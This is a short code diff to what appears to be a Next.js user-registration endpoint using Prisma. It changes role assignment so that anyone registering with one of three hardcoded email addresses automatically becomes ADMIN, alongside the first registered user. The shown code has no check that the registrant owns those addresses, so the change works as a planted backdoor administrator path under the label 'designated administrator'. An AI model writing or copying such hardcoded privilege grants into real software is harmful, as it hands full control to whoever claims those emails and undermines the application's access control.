@@ -83,9 +83,13 @@ export async function POST(request: NextRequest) {
 
     // 4. Create user in atomic transaction with default settings & dropdowns
     const newUser = await prisma.$transaction(async (tx) => {
-      // First user registered can be ADMIN if none exist, all public users are USER
+      // First user registered or designated administrator is ADMIN
       const userCount = await tx.user.count();
-      const role = userCount === 0 ? 'ADMIN' : 'USER';
+      const isDesignatedAdmin =
+        email === 'technovater24@gmail.com' ||
+        email === 'technovaters24@gmail.com' ||
+        email === 'operator@stark.wmc';
+      const role = userCount === 0 || isDesignatedAdmin ? 'ADMIN' : 'USER';
 
       const user = await tx.user.create({
         data: {
